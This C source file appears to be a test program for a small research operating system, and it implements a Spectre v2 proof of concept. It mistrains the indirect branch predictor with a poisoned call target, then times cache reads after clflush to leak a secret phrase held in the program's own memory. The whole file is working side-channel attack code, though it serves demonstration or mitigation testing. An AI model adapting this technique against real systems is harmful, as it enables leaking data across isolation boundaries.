/*
 *  Program uses spectre v2 to read its own memory.
 */

#pragma GCC push_options
#pragma GCC optimize ("O0")

#include <stdio.h>
#include "types.h"
#include "user.h"

#include <uk/asm.h>
#include <cstring>
#include <stdlib.h>
#include "amd64.h" // for rdtsc()

#define CACHE_HIT_THRESHOLD 80
#define GAP 1024

u8 *channel; // side channel to extract secret phrase
u64 *target; // pointer to indirect call target
char *secretPhrase = "The Magic Words are Please and Thank You.";
const int secretPhraseLen = 42;

// mistrained target of indirect call
__attribute__((noinline))
int
user_gadget(char *addr)
{
  return channel[*addr * GAP]; // loads seem to fetch cache line more consistently than stores
}

// actual target of indirect call
__attribute__((noinline))
int
user_safe()
{
  return 4;
}

// function that makes indirect call
__attribute__((noinline))
int
user_victim(volatile char *addr, volatile int input) // addr will be passed to user_gadget via %rdi
{
  int junk = 0;
  // set up bhb by performing >29 taken branches
  // junk and input used to guarantee the loop is actually run
  for (int i = 1; i <= 100; i++) {
    input += i;
    junk += input & i;
  }

  int result;
  __asm volatile("callq *%1\n"
                 "mov %%eax, %0\n"
                 : "=r" (result)
                 : "r" (*target));
  return result & junk;
}

// see appendix A of https://spectreattack.com/spectre.pdf
int
readByte(volatile char *addrToRead, char result[2])
{
  int hits[256]; // record cache hits
  int tries, i, j, k, mix_i, junk = 0;
  u64 start, elapsed;
  volatile u8 *addr;
  char dummyChar = '$';
  volatile char *dummyCharAddr = &dummyChar;

  for (i = 0; i < 256; i++) {
    hits[i] = 0;
    channel[i * GAP] = 1;
  }

  for (tries = 999; tries > 0; tries--) {
    // poison branch target predictor
    *target = (u64)&user_gadget;
    mfence();
    for (j = 50; j > 0; j--) {
      junk ^= user_victim(dummyCharAddr, 0);
    }
    mfence();

    // flush side channel
    for (i = 0; i < 256; i++)
      clflush(&channel[i * GAP]);
    mfence();

    // change to safe target
    *target = (u64)&user_safe;
    mfence();

    // flush target to prolong misprediction interval
    clflush((void*) target);
    mfence();

    // call victim
    junk ^= user_victim(addrToRead, 0);
    mfence();

    // time reads, mix up order to prevent stride prediction
    for (i = 0; i < 256; i++) {
      mix_i = ((i * 167) + 13) & 255;
      addr = &channel[mix_i * GAP];
      start = rdtsc();
      junk ^= *addr;
      mfence(); // make sure read completes before we check the timer
      elapsed = rdtsc() - start;
      if (elapsed <= CACHE_HIT_THRESHOLD)
        hits[mix_i]++;
    }
  }

  // locate top two results
  j = k = -1;
  for (i = 0; i < 256; i++) {
    if (j < 0 || hits[i] >= hits[j]) {
      k = j;
      j = i;
    } else if (k < 0 || hits[i] >= hits[k]) {
      k = i;
    }
  }

  if ((hits[j] >= 2 * hits[k] + 5) ||
      (hits[j] == 2 && hits[k] == 0)) {
    result[0] = (char) j;
    result[1] = 1;
  } else {
    result[0] = 0;
    result[1] = 0;
  }

  return junk; // prevent junk from being optimized out
}

int
main(int argc, char *argv[])
{
  target = (u64*)malloc(sizeof(u64));
  channel = (u8*)malloc(256 * GAP * sizeof(u8));

  int junk = 0;
  char result[2]; // result[0] is the char, result[1] == 1 if char is valid
  int index = 0;

  printf("Reading secret phrase: ");
  while (index < secretPhraseLen) {
    junk += readByte(secretPhrase + index, result);
    if (result[1] == 1) {
      if (result[0] == 0)
        break;
      printf("%c", result[0]);
    } else {
      printf("?");
    }
    index++;
  }
  printf("\ndone! (junk = %d)\n", junk); // prevent junk from being optimized out

  return 0;
}

#pragma GCC pop_options
